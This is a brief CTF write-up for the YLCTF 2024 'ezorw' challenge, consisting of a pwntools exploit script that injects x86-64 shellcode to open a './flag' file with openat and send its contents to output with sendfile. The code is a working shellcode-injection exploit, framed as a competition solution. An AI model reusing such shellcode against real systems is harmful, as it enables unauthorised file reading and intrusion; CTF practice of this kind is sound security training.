---
title: YLCTF 2024
date: '2025-02-25 08:16:13'
updated: '2025-04-07 21:33:51'
---
## ezorw
exp：

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

# link=remote("challenge.yuanloo.com",34307)
link=process("./ezorw")

gdb.attach(link,'b *0x40129D')

shellcode=asm('''
    mov rax, 0x67616c662f2e
    push rax
    xor rdi, rdi
    sub rdi, 100
    mov rsi, rsp
    xor edx, edx
    xor r10, r10
    push SYS_openat
    pop rax
    syscall
        
    mov rdi, 1
    mov rsi, 3
    push 0
    mov rdx, rsp
    mov r10, 0x100
    push SYS_sendfile
    pop rax
    syscall
''')

payload=shellcode
link.recvuntil("welcome to YLCTF orw~\n")
link.send(payload)

link.interactive()
```

